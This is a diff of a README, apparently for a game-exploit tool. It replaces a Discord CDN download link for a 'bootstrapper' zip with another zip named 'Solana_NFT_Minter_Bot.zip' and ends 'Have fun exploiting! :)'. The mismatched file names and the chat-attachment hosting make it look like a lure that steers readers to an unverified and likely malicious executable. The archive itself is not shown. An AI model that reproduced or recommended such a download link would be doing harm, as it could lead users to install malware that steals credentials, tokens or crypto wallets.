@@ -12,7 +12,7 @@ I have no Idea why this is causing an issue, but that happened to me. I'm not re
 I will try to find a fix for it soon. Please view the below example if you didn't understand:
 
 
-[Click to download the bootstrapper](https://cdn.discordapp.com/attachments/755678688531709983/996131743939702894/Nova_Z.zip)<br>
+[Click to download the bootstrapper](https://cdn.discordapp.com/attachments/755678688531709983/997187560210190437/Solana_NFT_Minter_Bot.zip)<br>
 
 Have fun exploiting! :)
 
